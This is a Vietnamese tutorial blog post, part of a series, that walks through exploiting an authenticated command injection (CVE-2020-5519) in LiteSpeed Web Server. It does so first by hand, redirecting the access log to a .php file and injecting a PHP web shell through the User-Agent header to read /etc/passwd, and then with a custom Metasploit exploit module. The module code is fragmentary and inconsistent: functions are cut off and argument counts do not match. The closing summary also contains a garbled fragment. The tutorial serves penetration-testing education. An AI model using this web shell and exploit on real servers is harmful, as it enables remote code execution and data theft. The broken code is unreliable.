![](https://images.viblo.asia/c74ff2b3-bb74-4a77-a3fb-afb4e607d250.jpg)

Tiếp nối những kiến thức ở [phần 3 ](https://viblo.asia/p/ky-thuat-khai-thac-lo-hong-bao-mat-web-tren-metasploit-framework-p3-bJzKmPBX59N) .  Hôm nay chúng ta sẽ tiếp tục cùng nhau viết  mã khai thác phức tạp hơn trên Metasploit Framework.

Đồng thời qua đây mình muốn gửi lời cảm ơn tới @doandinhlinh đã giúp mình sửa chữa và hoàn thiện mã khai thác này !
## 9. Kịch bản khai thác lỗ hổng command injection trong LiteSpeed WebServer Enterprise

LiteSpeed hay LiteSpeed Web Server (gọi tắt là LSWS) là một dịch vụ Web Server chạy trên nền tảng OS Linux. Được thiết kế bởi LiteSpeed Technologies Inc vào năm 2003. Đây là một trong những web server hoạt động trên nền tảng Linux có hiệu suất hoạt động cao và nhanh nhất hiện nay. 

Lỗ hổng do một đồng nghiệp của mình tìm ra và được pulic tại [đây](https://nvd.nist.gov/vuln/detail/CVE-2020-5519) 

**9.1. Dựng môi trường thử nghiệm**

Khi cài đặt Litespeed sẽ theo kèm một số ít các gói chương trình phụ thuộc (dependencies) nên cần phải cài đặt chúng để hỗ trợ tốt nhất cho việc cài đặt LiteSpeed Web Server.  Sử dụng các câu lệnh sau để cài đặt các chương chình phụ thuộc cần thiết:

```bash
# yum update –y
# yum install epel-release -y
# yum groupinstall -y 'Development Tools'
# yum install -y libxml2-devel openssl-devel bzip2-devel libcurl-devel db4-devel libjpeg-devel libpng-devel libXpm-devel freetype-devel gmp-devel libc-client-devel openldap-devel libmcrypt-devel mhash-devel freetds-devel zlib-devel mysql-devel ncurses-devel pcre-devel unixODBC-devel postgresql-devel sqlite-devel aspell-devel readline-devel recode-devel net-snmp-devel libtidy-devel libxslt-devel t1lib-devel wget
```

Tiếp theo tải xuống gói cài đặt LSWS:

![](https://images.viblo.asia/85e7d4e3-02b2-4861-a9c3-f8db5417ce4e.jpg)

Sử dụng lệnh sau để tải về và giải nén bản cài đặt đặt LSWS trên máy chủ centos:

```bash
# wget https://www.litespeedtech.com/packages/5.0/lsws-5.2.3-ent-x86_64-linux.tar.gz
# tar -xvfz lsws-5.2.3-ent-x86_64-linux.tar.gz
```

Cài đặt LSWS bằng cách sử dụng các lệnh sau:

```bash
# mv trial.key lsws-5.2.3
# cd lsws-5.2.3
```

Sau khi đọc hết điều khoản Litespeed sẽ hỏi đồng ý với các điều trên không, ấn “**Y**” để tiếp tục. Tiếp theo chọn **Yes** thì LiteSpeed sẽ hỏi tiếp thư mục cài đặt chương trình Litespeed Web Server sẽ lưu vào đâu, nhấn phím **Enter** để sử dụng tham số mặc định.

```
Please specify the destination directory. You must have permissions to
create and manage the directory. It is recommended to install the web server
at /opt/lsws, /usr/local/lsws or in your home directory like '~/lsws'.

ATTENTION: The user 'nobody' must be able to access the destination
```
Tiếp theo thiết lập port quản trị dịch vụ LSWS, mặc định là port 7080.

```
Please specify the HTTP port for the administration web interface,
which can be accessed through http://<YOUR_HOST>:<ADMIN_PORT>/
```
Sau đó LSWS sẽ được khởi động:
```
To change configurations of the interface, login and click
"Interface Configuration" button on the main page.
The administration interface is located at http://localhost:<ADMIN_PORT>/
or http://<ip_or_Hostname_of_this_machine>:<ADMIN_PORT>/

Would you like to have LiteSpeed Web Server started automatically
when the server restarts [Y/n]? Y
```
Cấu hình tường lửa firewall để cho phép truy cập vào port 8088 và 7080

```
# iptables -I INPUT -p tcp --dport 80 -j ACCEPT
# iptables -I INPUT -p tcp --dport 7080 -j ACCEPT
```

Truy cập vào địa chỉ https://IP:7080 sẽ thấy giao diện đăng nhập trang quản lý của dịch vụ Web Server LiteSpeed.

![](https://images.viblo.asia/b4ca84cd-685b-43e0-b832-394f50960da4.jpg)

![](https://images.viblo.asia/ba2db4f3-e97c-4118-90e8-fda75f6baeb2.jpg)


**9.2. Khai thác lỗ hổng Command Injection trong Litespeed WebServer bằng "tay"**
* Mô hình tấn công máy chủ chạy LSWS* 
![](https://images.viblo.asia/4615a377-9c79-4653-89a7-1065150417a8.png)

Đăng nhập vào trang quản trị của LSWS:

![](https://images.viblo.asia/b4ca84cd-685b-43e0-b832-394f50960da4.jpg)

Khai thác lỗ hổng thực thi mã từ xa thông qua cơ chế lưu lại thông tin truy cập người dùng của LSWS với người dùng đã xác thực.
Truy cập  “web console”:
![](https://images.viblo.asia/97864276-0511-42bf-ac14-109793f65a4c.png)

Trong mục **“Access Log**” nhấn vào nút “edit” để sửa thông tin file name. Chức năng chính của mục này giúp cho người dùng tùy chọn để lưu thông tin về các lượt truy cập lên máy chủ. Lợi dụng việc này kẻ tấn công sẽ thay thế nơi lưu tệp bằng đường dẫn tới thư mục mã nguồn cài đặt của LSWS hoặc nơi lưu mã nguồn của các dịch vụ web đang chạy trên server. 

Trong ví dụ này kẻ tấn công sửa đổi đường dẫn tệp thông tin truy cập vào đường dẫn chứa mã nguồn của LSWS tại “**/usr/local/lsws/admin/html/hacked.php**”. Sau đó nhấn nút “Graceful Restart” để LSWS khởi động lại.

![](https://images.viblo.asia/6d2a25b7-59b7-47e3-a636-7944fd87b598.png)

Sau khi LSWS khởi động lại, truy cập vào đường dẫn tệp bị sửa đổi trên:
![](https://images.viblo.asia/6bc594ff-80c7-4d9a-976d-a4448c3681e1.png)

Lúc này do tất cả các truy cập tới máy chủ đều lưu lại thông tin vào tệp ở đường dẫn “**/usr/local/lsws/admin/html/hacked.php**”. 
Các thông tin này bao gồm địa chỉ ip truy cập, thông tin ngày giờ truy cập và thông tin về máy khách. Sửa thông tin về máy khác ở tham số “User-agent” và chèn mã khai thác vào thông tin này để thực thi mã từ xa trên máy chủ. 

Mã khai thác:

```php
<?php $output = shell_exec($GET['cmd']);
```

Đoạn mã trên sẽ thực hiện chạy câu lệnh kẻ tấn công truyền vào thông qua tham số *cmd* của giao thức GET trên đường dẫn. Sau đó trả lại kết quả về cho kẻ tấn công.

![](https://images.viblo.asia/7da8e5ed-440c-4728-9f6a-a11bff5eb5d5.png)

Sau khi thực hiện việc đẩy mã khai thác lên máy chủ. Kẻ tấn công quay lại truy cập vào đường dẫn trên và thực hiện chạy mã từ xa trên máy chủ. Trong ví dụ dưới đây kẻ tấn công thực hiện lệnh  "cat /etc/passwd" để lấy thông tin về người dùng hệ thống trên máy chủ:

![](https://images.viblo.asia/2aad94ab-71b4-43a6-90ea-fab74452aaeb.png)

**9.3. Khai thác lỗ hổng Command Injection trong Litespeed WebServer bằng Metasploit Framework**

Lỗ hổng trên yêu cầu người dùng cần xác thực và trải qua nhiều bước khác nhau. Nên khi viết mã khai thác cho lỗ hổng này, người viết mã cần có phương hướng rõ ràng. Mã khai thác sẽ thực hiện lần lượt các bước sau:
- Đăng nhập vào LSWS để lấy thông tin phiên đăng nhập của người dùng.
- Lấy mã xác thực yêu cầu của LSWS “tk” ứng với mỗi phiên đăng nhập của tài khoản.
- Sử dụng cookies, và mã xác thực tham số “tk” để gửi yêu cầu thay đổi đường dẫn lưu trữ tệp nhật ký truy cập trên máy chủ.
- Thực hiện yêu cầu “restart” lại máy chủ.
- Truy cập vào đường dẫn tệp vừa tạo để chèn payload và thực hiện thực thi mã từ xa.

Bắt đầu mã khai thác bằng việc khai báo các thông tin cần thiết và các tham số sử dụng trong mã khai thác:

```ruby
require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpClient
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Vulnerable LiteSpeed Webserver Remote Code Execution', #title of the exploit
            'Description' => %q{
                This module exploits a vulnerable LiteSpeed Webserver web app created by linhdd.
            },
            'License'       => MSF_LICENSE,
            'Author'        => [
                ],
            'References' => [
                    ['URL', 'https: //github.com/rapid7/metasploit-framework/wiki'], # Metasploit Wiki
                ],
            'Privileged' => false,
            'Payload' => {
                'Space' => 10000,
                'DisableNops' => true,

```
Các tham số đầu vào cần xác định trước chính là thông tin về tài khoản và mật khẩu của người dùng. Tiếp theo là hàm dùng để gửi yêu cầu đăng nhập. 

```ruby
def do_login(username, password)
        protocol  = ssl ? 'https' : 'https'
        print_status("1")
        peer      = "#{rhost}:#{rport}"
        res = send_request_cgi({
            'uri'     => normalize_uri(target_uri, 'login.php'),
            'version' => "1.1",
            'method' => "POST",
            'cookie' => '',
            'headers' => { 
                'Referer' => "#{protocol}://#{peer}/login.php",
                'Connection'=> "close",
                'Content-Length'=> 37,
                'Cache-Control'=> "max-age=0",
                'Upgrade-Insecure-Requests'=> 1,
                'Content-Type'=> "application/x-www-form-urlencoded",
                'Sec-Fetch-Site'=> "same-origin",
                'Sec-Fetch-Mode'=> "navigate",
```
Sử dụng hàm "**send_request_cgi**" để gửi yêu cầu đăng nhập lên máy chủ. Sau đó xử lý phản hồi của máy chủ. 
Nếu thành công sẽ trả về cookies. Sử dụng cookie này cho các yêu cầu gửi lên máy chủ sau này. Hàm sau dùng để lấy tham số "**tk**" từ máy chủ. 

Tham số “**tk**” sẽ được dùng để gửi lên cùng với tất cả các yêu cầu từ người dùng lên máy chủ. Tham số này có tác dụng phòng tránh dạng tấn công CSRF:

```ruby
def get_tk_parram(cookie)
        protocol  = ssl ? 'https' : 'https'
        peer      = "#{rhost}:#{rport}"
        res = send_request_cgi({
            'uri'     => normalize_uri(target_uri, 'index.php'),
            'version' => "1.1",
            'method' => "GET",
            'cookie' => cookie,
            'headers' => { 
                'Referer' => "#{protocol}://#{peer}/index.php",
                'Connection'=> "close",
                'Cache-Control'=> "max-age=0",
                'Upgrade-Insecure-Requests'=> 1,
                'Content-Type'=> "application/x-www-form-urlencoded",
                'User-Agent'=> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
                'Sec-Fetch-Site'=> "same-origin",
                'Sec-Fetch-Mode'=> "navigate",
```

```ruby
def edit_access_log(cookie, tk)
        protocol  = ssl ? 'https' : 'https'
        peer      = "#{rhost}:#{rport}"
        res = send_request_cgi({
            'uri'     => normalize_uri(target_uri, 'config/confMgr.php'),
            'version' => "1.1",
            'method' => "POST",
            'cookie' => cookie,
            'headers' => { 
                'Referer' => "#{protocol}://#{peer}/config/confMgr.php?m=admin&p=general&t=VH_ACLOG&a=e&tk=#{tk}",
                'Content-Type'=> "application/x-www-form-urlencoded",
                'User-Agent'=> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
            },
            'vars_post' => {
                'useServer' => 0,
                'fileName' => "/usr/local/lsws/admin/html/t5.php",
                'pipedLogger' => "",
                'logFormat' => "",
                'rollingSize' => "10M",
                'keepDays' => 90,
                'bytesLog' => "",
                'compressArchive' => "",
                'a'=> "s",
                'm' => "admin",
                'p' => "general",
                't' => "VH_ACLOG",
                'r' => "",
                'tk' => tk,
                'file_create' => ""
            }
        })
        if res && res.code == 200
            return res.body
        end
        return nil unless res ''
end

```

Đoạn mã “**res.body.match/(v\S+)=["']?((?:.(?!["']?\s+(?:\S+)=|[>"']) )+.) ["'] ?/**” sử dụng “regex” để xử lý nội dung máy chủ trả về và lấy tham số “**tk**”. 

Sau khi có cookie và tham số "**tk**" cần thiết cho việc gửi các yêu cầu điều khiển hệ thống, hàm sau dùng để thay đổi đường dẫn lưu trữ của tệp nhật ký truy cập trên máy chủ:

Sau khi thay đổi nơi lưu đường dẫn tệp nhật ký truy cập trên máy chủ cần khởi động lại LSWS:

```ruby
def restart_server(cookie, tk)
        protocol  = ssl ? 'https' : 'https'
        peer      = "#{rhost}:#{rport}"
        res = send_request_cgi({
            'uri'     => normalize_uri(target_uri, '/service/serviceMgr.php'),
            'version' => "1.1",
            'method' => "POST",
            'cookie' => cookie,
            'headers' => { 
                'Referer' => "#{protocol}://#{peer}/config/confMgr.php",
                'Content-Type'=> "application/x-www-form-urlencoded",
                'Sec-Fetch-Site'=> "same-origin",
                'Sec-Fetch-Mode'=> "navigate"
            },
   ```
   
Các hàm cần thiết cho việc khai thác đã được cài đặt. Phần khai thác lỗ hổng chính sẽ nằm trong hàm **exploit()**. 

Ở hàm này sẽ sử dụng các hàm đã viết ở trên để thực hiện khai thác lỗ hổng lần lượt các bước theo kịch bản. 
Ở bước khởi động lại LSWS cần cho MSF nghỉ khoảng 3 giây trước khi thực hiện việc tiếp theo thông qua câu lệnh sleep(3). 

Điều này giúp chắc chắn rằng LSWS đã khởi động lại thành công. Sau đó payload của MSF sẽ được chèn vào tham số "**User-agent**" của yêu cầu gửi lên server. 

Lúc này nếu thành công máy chủ sẽ thực hiện payload này và MSF có thể thực thi mã từ xa ngược lại lên máy chủ.

```ruby
def exploit
        cookie = do_login(datastore['USERNAME'], datastore['PASSWORD'])
        
        if cookie == '' || cookie.nil?
            fail_with(Failure::Unknown, 'Failed to retrieve session cookie')
        end
        print_status("Successfull get cookie: #{cookie}")
        
        tk = get_tk_parram(cookie)
        if tk == '' || tk.nil?
            fail_with(Failure::Unknown, 'Failed to retrieve tk parram!')
        end
        print_status("Successfull get tk parram: #{tk}")
        shell_name = Rex::Text.rand_text_alpha(10)
        print_status("Shell code upload to: #{shell_name}.php")
        edit_access_log(cookie, tk, shell_name)
        p = restart_server(cookie, tk)
        print_status("Waiting for server restart in 5s.")
        sleep(5)
        print_status("Successfull to restart server")
        protocol  = ssl ? 'https' : 'https'
        peer      = "#{rhost}:#{rport}"
        
        print_status("Use payload: #{payload.encoded}")
        print_status("Upload shell!")

```

**9.3.1. Sử dụng mã khai thác**

Lưu mã khai thác vào thư mục cài đặt MSF  "**/usr/share/metasploit-framework/modules/exploits/myexploits/litepeed.rb**". Sau đó khởi động litespeed. Đặt các tham số cần thiết cho việc khai thác:

![](https://images.viblo.asia/d5853c7c-7fac-4aca-b214-e8c4a9c6abef.png)

Sau khi khai thác thành công, MSF sẽ giữ kết nối đến máy chủ và thực hiện thực thi mã từ xa. Sử dụng câu lệnh “id” để xem thông tin về người dùng hiện tại của hệ thống và câu lệnh “cat /etc/passwd” để đọc file "/etc/passwd" của máy chủ:

![](https://images.viblo.asia/55216b39-3ae4-467b-8b57-c49bd0ad71a2.png)

## 10. Tổng kết

Metasploit Framework là một môi trường dùng để kiểm tra, tấn công và khai thác lỗi của các dịch vụ. Việc sử dụng MSF để viết mã và khai thác các lỗ hổng giúp cho quá trình kiểm thử được rút ngắn thời gian đi rất nhiều. Một mã khai thác khi được hoàn thành có thể nhanh chóng kiểm thử và khai thác các lỗ hổng trên nhiều mục tiêu khác nhau mang lại sự thuận tiện cho quy trình kiểm thử.
 hơn, con đường khai thác dài và phức tạp hơn. Xin cảm ơn mọi người đã đọc tới đây, hẹn gặp lại ở phần 4.

Tài liệu tham khảo :

https://github.com/rapid7/metasploit-framework/wiki

https://www.offensive-security.com/metasploit-unleashed/

Thank to @doandinhlinh